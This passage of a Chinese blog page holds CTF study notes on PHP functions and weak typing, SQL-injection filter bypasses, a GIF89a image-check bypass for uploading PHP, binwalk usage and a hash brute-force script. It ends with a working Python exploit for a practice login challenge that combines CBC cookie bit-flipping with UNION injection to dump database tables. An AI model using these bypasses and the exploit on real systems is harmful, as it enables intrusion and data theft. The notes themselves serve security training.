+opendir() 函数打开一个目录句柄，若成功，则该函数返回一个目录流，否则返回 false 以及一个 error。可以通过在函数名前加上 &quot;@&quot; 来隐藏 error 的输出。
+readdir() 函数返回由 opendir() 打开的目录句柄中的条目。若成功，则该函数返回一个文件名，否则返回 false。
+closedir — 关闭目录句柄。
+
+
+&gt; * print_r(scandir(&quot;.&quot;));  获取当前目录结构
+
+&gt; * unlink的问题非常明显，/.的后缀就可以绕过
+
+&gt; * PHP print_r() 函数
+&gt; print_r() 函数用于打印变量，以更容易理解的形式展示。
+
+
+&gt; * linux下一般使用vi编辑器，并且异常退出会留下备份文件
+&gt; (host)/.submit.php.swp
+
+
+
+&gt; * PHP file_get_contents()函数
+&gt; 能够远程打开链接
+
+&gt; *  PHP输入流php://input
+&gt; php://input可以读取没有处理过的POST数据。相较于$HTTP_RAW_POST_DATA而言，它给内存带来的压力较小，并且不需要特 殊的php.ini设置。php://input不能用于enctype=multipart/form-data
+
+
+
+&gt; * PHP extract() 函数
+&gt; extract() 函数从数组中将变量导入到当前的符号表。
+&gt; 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。
+第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。
+该函数返回成功导入到符号表中的变量数目。
+
+
+&gt; * PHP file_put_contents() 函数
+&gt; file_put_contents() 函数把一个字符串写入文件中。
+与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。
+
+&gt; * MAKE_SET(bits,str1,str2,...)
+返回一个设定值 (一个包含被‘,’号分开的字字符串的字符串) ，由在bits 组中具有相应的比特的字符串组成。str1 对应比特 0, str2 对应比特1,以此类推。str1, str2, ...中的 NULL值不会被添加到结果中。
+``` SQL
+mysql&gt; SELECT MAKE_SET(1,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);
+
+-&gt; &#39;a&#39;
+
+mysql&gt; SELECT MAKE_SET(1 | 4,&#39;hello&#39;,&#39;nice&#39;,&#39;world&#39;);
+
+-&gt; &#39;hello,world&#39;
+
+mysql&gt; SELECT MAKE_SET(1 | 4,&#39;hello&#39;,&#39;nice&#39;,NULL,&#39;world&#39;);
+
+-&gt; &#39;hello&#39;
+
+mysql&gt; SELECT MAKE_SET(0,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);
+
+-&gt; &#39;&#39;
+--------------------- 
+</code></pre><blockquote>
+<ul>
+<li>xpath处理函数(extractvalue和updatexml)：<br>从mysql5.1.5开始提供两个XML查询和修改的函数，其中extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容。<br>mysql&gt; select * from mysql.user where user = ‘root’ and extr</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP str_replace()<br>str_replace(“要替换的字符串”,”替换成的结果字符串”，“目标字符串”)</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>php create_function()匿名函数<br>create_function(‘参数’,’函数体’):<br>create_function创建的是匿名函数，而匿名函数也是有名字的，名字是\x00lambda_%d，其中%d代表他是当前进程中的第几个匿名函数。%d会从1一直进行递增，表示这是当前进程中第几个匿名函数。因此如果开启一个新的php进程，那么这个匿名函数就是\x00lambda_1</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>openssl_random_pseudo_bytes - 生成伪随机字节串<br>它还指示是否使用加密强算法来生成伪随机字节，并通过可选crypto_strong 参数执行此操作。这种情况很少见FALSE，但有些系统可能会破损或过时。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP bin2hex() 函数<br>bin2hex() 函数把 ASCII 字符的字符串转换为十六进制值。字符串可通过使用 pack() 函数再转换回去。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>Apache的默认模式Pre-fork会随着请求数量的增加而启动若干新的进程 。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>sha1()函数默认的传入参数类型是字符串型，可以传入其他类型，使其返回值为false。如数组类型。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>使用git log命令，什么参数都没有的话，会输出所有的日志。如果日志特别多的话，在git bash中，按向下键来查看更多，按q键退出查看日志。<br>git reset<br>常用的到命令，主要有三种情况。<br>错误commit后，仅撤销commit，暂存区、工作区内容不变。<br>git log<br>git reset –soft commit-id  // commit-id为错误commit之前的，commit-ID<br>// 如<br>// commit-id f34a (错误的commit，当前版本库)<br>// 一些描述<br>// commit-id d3fs (正确的commit）<br>// git reset –soft d3fs</li>
+</ul>
+</blockquote>
+<p>错误commit后，撤销commit和add，工作区内容不变<br>git log<br>git reset –mixed commit-id<br>// 该命令相当于恢复到 git add 之前的状态，同时工作区的内容不变</p>
+<p>错误commit之后，想恢复到某个版本库的代码(暂存区，工作区均变化）<br>git log<br>git reset –hard commit-id </p>
+<blockquote>
+<ul>
+<li>PHP strpos() 函数<br>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP str_rot13() 函数<br>str_rot13() 函数对字符串执行 ROT13 编码。<br>ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>md5(“ffifdyop”) 产生 or’</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>GET参数SQL注入%0A换行污染绕过<br>在GET请求时，将URL的SQL注入关键字用%0A分隔，%0A是换行符，在mysql中可以正常执行。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP in_array() 函数<br>in_array() 函数搜索数组中是否存在指定的值。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>%a0=空格</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>php精度（16以上）var_dump(9999999999999999999==1);//true</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP strripos() 函数<br>strripos() 函数查找字符串在另一字符串中最后一次出现的位置。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP NULL==0</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>strpos处理数组，返回NULL</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP is_numeric() 函数<br>is_numeric() 函数用于检测变量是否为数字或数字字符串</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>md5运算函数有一个true参数，它的作用是将md5后的hex转换成字符串，这里如果后的字符串有单引号之类的字符就可以注入了</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP strrev() 函数<br>strrev() 函数反转字符串。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>getimagesize函数验证：<br>只要在文件头添加GIF89a即可，我们来测试一下<br>var_dump(getimagesize(“phpinfo.php”));<br>然后phpinfo.php文件的内容为：&lt;?php phpinfo(); ?&gt;<br>结果返回bool(false)<br>修改文件内容如下：<br>GIF89a<br>&lt;?php phpinfo(); ?&gt;<br>返回结果为<br>array(6) {<br>[0]=&gt;<br>int(2573)<br>[1]=&gt;<br>int(16188)<br>[2]=&gt;<br>int(1)<br>[3]=&gt;<br>string(27) “width=”2573″ height=”16188″”<br>[“channels”]=&gt;<br>int(3)<br>[“mime”]=&gt;<br>string(9) “image/gif”<br>}</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>以iconv()函数为例，在iconv转码的过程中,utf-&gt;gb2312(其他部分编码之间转换同样存在这个问题)会导致字符串被截断，如：$filename=”shell.php(hex).jpg”;(hex为0x80-0x99)，经过iconv转码后会变成$filename=”shell.php “。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>Data URI scheme (data: base64) 协议常用数据格式<br>  data:,&lt;文本数据&gt;<br>  data:text/plain,&lt;文本数据&gt;<br>  data:text/html,&lt;HTML代码&gt;<br>  data:text/html;base64,&lt;base64编码的HTML代码&gt;<br>  data:text/css,&lt;CSS代码&gt;<br>  data:text/css;base64,&lt;base64编码的CSS代码&gt;<br>  data:text/javascript,&lt;Javascript代码&gt;<br>  data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;<br>  data:image/gif;base64,base64编码的gif图片数据<br>  data:image/png;base64,base64编码的png图片数据<br>  data:image/jpeg;base64,base64编码的jpeg图片数据<br>  data:image/x-icon;base64,base64编码的icon图片数据<br>URI（Uniform Resource Identifier）:统一资源标识符,服务器资源名被称为统一资源标识符。<br>URL（Uniform Resource Locator）:统一资源定位符，描述了一台特定服务器上某资源的特定位置。<br>URN（Uniform Resource Name）:统一资源名称</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的&gt; 校验，从而导致意外的文件泄露甚至恶意的代码注入。涉及文件包含漏洞的四个函数如下：<br>include()<br>include_once()<br>require()<br>require_once()<br>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。<br>include() 如果出错的话，仍然会继续执行后续语句。<br>require_once()和 include_once()功能与require()和 include()类似，如果一个文件已经被包含过了，则不会再次包含。</li>
+</ul>
+</blockquote>
+<h1 id="Misc-题-笔记"><a href="#Misc-题-笔记" class="headerlink" title="Misc 题 笔记"></a>Misc 题 笔记</h1><blockquote>
+<ul>
+<li>Binwalk是路由器固件分析的必备工具，该工具最大的优点就是可以自动完成指定文件的扫描，智能发掘潜藏在文件中所有可疑的文件类型及文件系统。<br><code>`</code><br>2、Binwalk的提取与分析</li>
+</ul>
+</blockquote>
+<p>2.1、固件扫描</p>
+<p>　　命令：binwalk firmware.bin      —–&gt;   通过扫描能够智能地发现目标文件中包含的所有可识别的文件类型。</p>
+<p>2.2、提取文件</p>
+<p>　　命令：binwalk -e firmware.bin ——&gt;   选项“-e”和“–extract”用于按照定义的配置文件中的提取方法从固件中提取探测到的文件系统。</p>
+<p>　　命令：binwalk -Me firmware.bin —–&gt; 选项“-M”和“–matryoshka”用于根据magic签名扫描结果进行递归提取，仅对”-e”和“–dd”选项有效。</p>
+<p>　　命令：binwalk -Me -d 5 firmware.bin —-&gt; 选项“-d”和“–depth=<int>“用于限制递归提取深度，默认深度为8，仅当“-M”选项存在时有效。</int></p>
+<p>2.3、显示完整的扫描结果</p>
+<p>　　命令：binwalk -I firmware.bin ——&gt;   选项”-I”和“–invalid”用于显示扫描的所有结果（即使是扫描过程中被定义为“invalid“的项）。</p>
+<p>　　　　　　当我们认为binwalk错把有效的文件当成无效文件时，可以通过该选项来检查。</p>
+<p>2.4、指令系统分析</p>
+<p>　　选项“A”和“–opcodes”用于扫描指定文件中通用CPU架构的可执行代码。</p>
+<p>　　由于某些操作码签名比较短，所以比较容易造成误判。如果我们需要确定一个可执行文件的CPU架构，可以使用该命令。</p>
+<p>　　命令：命令：binwalk -A 70|more </p>
+<p>　　使用Binwalk扫描从firmware.bin中提取的文件的文件“70”中的可执行代码，在该文件中可以发现CPU的架构（大端或者小端也会给出）。</p>
+<pre><code>
+# Crypto题笔记
+
+&gt; * Python里面的hashlib模块提供了很多加密的算法
+``` python
+import hashlib
+pool = &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
+s0 = &#39;TASC?O3RJMV?WDJKX?ZM&#39;
+ss = s0.split(&#39;?&#39;)
+m = &#39;e9032???da???08????911513?0???a2&#39;
+
+for i in pool:
+    for j in pool:
+        for k in pool:
+            md5 = hashlib.md5()
+            s = ss[0] + i + ss[1] + j + ss[2] + k + ss[3]
+            md5.update(s.encode(&#39;utf-8&#39;))
+            #print(s)
+            if md5.hexdigest()[:5] == m[:5]:
+                print(s,md5.hexdigest())
+                break
+</code></pre><h1 id="实验吧"><a href="#实验吧" class="headerlink" title="实验吧"></a>实验吧</h1><h2 id="实验吧web题"><a href="#实验吧web题" class="headerlink" title="实验吧web题"></a>实验吧web题</h2><h3 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf8 -*-</span>
+<span class="token comment" spellcheck="true"># python 2.7</span>
+<span class="token keyword">from</span> base64 <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">import</span> urllib
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+
+<span class="token keyword">def</span> <span class="token function">denglu</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span>idx<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    url<span class="token operator">=</span>r<span class="token string">'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span>
+
+    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>
+
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
+
+    Set_Cookie<span class="token operator">=</span>r<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">]</span>
+
+    iv<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"iv=(.*?),"</span><span class="token punctuation">,</span> Set_Cookie<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+
+    cipher<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"cipher=(.*)"</span><span class="token punctuation">,</span> Set_Cookie<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+
+    iv_raw <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    cipher_raw<span class="token operator">=</span>b64decode<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    lst<span class="token operator">=</span>list<span class="token punctuation">(</span>cipher_raw<span class="token punctuation">)</span>
+
+    lst<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token operator">=</span>chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>lst<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>ord<span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token operator">^</span>ord<span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    cipher_new<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>lst<span class="token punctuation">)</span>
+
+    cipher_new<span class="token operator">=</span>urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>cipher_new<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    cookie_new<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'iv'</span><span class="token punctuation">:</span> iv<span class="token punctuation">,</span><span class="token string">'cipher'</span><span class="token punctuation">:</span>cipher_new<span class="token punctuation">}</span>
+
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie_new<span class="token punctuation">)</span>
+
+    cont<span class="token operator">=</span>r<span class="token punctuation">.</span>content
+
+    plain <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"base64_decode\('(.*?)'\)"</span><span class="token punctuation">,</span> cont<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+
+    plain <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>plain<span class="token punctuation">)</span>
+
+    first<span class="token operator">=</span><span class="token string">'a:1:{s:2:"id";s:'</span>
+
+    iv_new<span class="token operator">=</span><span class="token string">''</span>
+
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+        iv_new <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>first<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>ord<span class="token punctuation">(</span>plain<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>ord<span class="token punctuation">(</span>iv_raw<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    iv_new <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>iv_new<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    cookie_new <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'iv'</span><span class="token punctuation">:</span> iv_new<span class="token punctuation">,</span> <span class="token string">'cipher'</span><span class="token punctuation">:</span> cipher_new<span class="token punctuation">}</span>
+
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie_new<span class="token punctuation">)</span>
+
+    rcont <span class="token operator">=</span> r<span class="token punctuation">.</span>content
+
+    <span class="token keyword">print</span> rcont
+
+denglu<span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">)</span>
+
+denglu<span class="token punctuation">(</span><span class="token string">'0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">)</span>
+
+denglu<span class="token punctuation">(</span><span class="token string">'0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">)</span>
+
+denglu<span class="token punctuation">(</span><span class="token string">"0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);"</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">)</span>
+
+denglu<span class="token punctuation">(</span><span class="token string">"0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);"</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">)</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/笔记/">笔记</a>, <a href="/tags/CTF/">CTF</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:fakerye.github.io">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">Categories</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/CTF/">CTF</a><small>1</small></li>
+  
+    <li><a href="/categories/Web/">Web</a><small>3</small></li>
+  
+    <li><a href="/categories/CTF/Web/">Web</a><small>1</small></li>
+  
+    <li><a href="/categories/安全/">安全</a><small>4</small></li>
+  
+    <li><a href="/categories/Web/笔记/">笔记</a><small>3</small></li>
+  
+    <li><a href="/categories/安全/笔记/">笔记</a><small>4</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Recent Posts</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2020/02/04/20200204/">2020年2月04日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/02/01/20200201/">2020年2月01日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/01/29/20200129/">2020年1月29日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/01/15/20200115/">2020年1月15日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/01/14/20200114/">2020年1月14日学习笔记</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/CTF/">CTF</a><small>4</small></li>
+  
+    <li><a href="/tags/SQL/">SQL</a><small>1</small></li>
+  
+    <li><a href="/tags/Web/">Web</a><small>6</small></li>
+  
+    <li><a href="/tags/Writeup/">Writeup</a><small>1</small></li>
+  
+    <li><a href="/tags/安全/">安全</a><small>4</small></li>
+  
+    <li><a href="/tags/扩展/">扩展</a><small>1</small></li>
+  
+    <li><a href="/tags/笔记/">笔记</a><small>9</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">Tag Cloud</h3>
+  <div class="entry">
+    <a href="/tags/CTF/" style="font-size: 13.33px;">CTF</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/Web/" style="font-size: 16.67px;">Web</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/安全/" style="font-size: 13.33px;">安全</a> <a href="/tags/扩展/" style="font-size: 10px;">扩展</a> <a href="/tags/笔记/" style="font-size: 20px;">笔记</a>
+  </div>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2020 John Doe
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id="bg"></div>
+</body>
+</html>
